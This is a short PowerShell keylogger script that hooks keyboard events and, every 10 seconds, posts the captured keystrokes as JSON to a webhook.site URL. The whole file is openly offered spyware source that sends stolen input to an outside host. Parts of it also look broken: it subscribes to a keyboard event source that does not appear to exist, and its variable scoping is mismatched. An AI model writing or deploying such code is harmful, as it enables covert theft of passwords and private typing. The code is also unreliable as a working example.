
# key.ps1 - Simple keylogger that sends keys to webhook.site every 10 seconds

Add-Type -AssemblyName System.Windows.Forms

$webhookUrl = 'https://webhook.site/b620ae52-906d-433a-a17c-8cd91ef5e1ae'
$keys = ""

Register-ObjectEvent -InputObject [System.Windows.Forms.Keyboard] -EventName KeyDown -Action {
    param($sender, $e)
    $script:keys += $e.KeyCode.ToString()
}

while ($true) {
    Start-Sleep -Seconds 10
    if ($keys.Length -gt 0) {
        # Send keys to webhook as JSON
        Invoke-RestMethod -Uri $webhookUrl -Method POST -Body (@{keys=$keys} | ConvertTo-Json) -ContentType 'application/json'
        $keys = ""
    }
}
